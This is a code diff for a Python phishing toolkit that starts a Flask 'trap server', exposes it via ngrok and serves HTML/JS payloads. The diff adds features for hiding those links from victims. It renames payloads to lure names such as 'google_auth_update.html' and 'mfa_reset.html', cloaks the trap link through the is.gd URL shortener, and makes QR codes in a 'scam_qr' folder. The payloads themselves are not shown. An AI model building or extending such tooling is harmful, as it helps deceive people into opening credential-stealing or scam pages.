@@ -7,17 +7,20 @@ import json
 import socket
 from pathlib import Path
 import qrcode
+import random
+import requests
+import shutil
 
 PAYLOADS_DIR = "payloads"
+OBF_DIR = os.path.join(PAYLOADS_DIR, "obf_payloads")
 SCAM_QR_DIR = "scam_qr"
 CHAINED_FILENAME = "chained_payload.html"
 
-# Make folders if missing
 os.makedirs(PAYLOADS_DIR, exist_ok=True)
+os.makedirs(OBF_DIR, exist_ok=True)
 os.makedirs(SCAM_QR_DIR, exist_ok=True)
 
 def is_flask_up(host="127.0.0.1", port=5000):
-    """Check if the Flask server is listening on port 5000"""
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         sock.settimeout(1)
         return sock.connect_ex((host, port)) == 0
@@ -25,7 +28,7 @@ def is_flask_up(host="127.0.0.1", port=5000):
 def launch_flask_server():
     print(" ✅ Launching Flask trap server...")
     subprocess.Popen(["python3", "-m", "server.flask_server"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    for i in range(10):
+    for _ in range(10):
         if is_flask_up():
             print(" ✅ Flask server is up and listening on port 5000.")
             return
@@ -49,6 +52,25 @@ def launch_ngrok():
 
 def list_payloads():
     return sorted([f for f in os.listdir(PAYLOADS_DIR) if f.endswith(".html") or f.endswith(".js")])
+
+def obfuscate_filename(original_filename):
+    names = [
+        "invoice_2025.html", "login_error.html", "google_auth_update.html",
+        "session_timeout.html", "email_verify_2fa.html", "mfa_reset.html"
+    ]
+    return random.choice(names)
+
+def shorten_url(long_url):
+    try:
+        print(" 🔧 Shortening URL via is.gd...")
+        res = requests.get("https://is.gd/create.php", params={"format": "simple", "url": long_url})
+        if res.status_code == 200:
+            short = res.text.strip()
+            print(f" 🔗 Shortened: {short}")
+            return short
+    except:
+        print(" ❌ Failed to shorten URL.")
+    return long_url
 
 def upload_custom_payload():
     path = input(" Path to your payload (.html or .js): ").strip()
@@ -108,13 +130,19 @@ def trap_payload_picker(public_url):
         print("❌ Invalid selection.")
         return
 
-    full_link = f"{public_url}/payloads/{filename}"
-    print(f"\n ✅ Your trap link is ready:\n{full_link}\n")
+    original_path = os.path.join(PAYLOADS_DIR, filename)
+    obf_name = obfuscate_filename(filename)
+    obf_path = os.path.join(OBF_DIR, obf_name)
+    shutil.copyfile(original_path, obf_path)
+
+    full_link = f"{public_url}/payloads/obf_payloads/{obf_name}"
+    short_link = shorten_url(full_link)
+
+    print(f"\n ✅ Your trap link is cloaked:\n{short_link}\n")
 
     q = input("[?] Generate QR code for this link? (y/n): ").lower()
     if q == "y":
-        base_name = Path(filename).stem
-        generate_qr(full_link, base_name)
+        generate_qr(short_link, Path(obf_name).stem)
 
 def main_menu():
     while True:
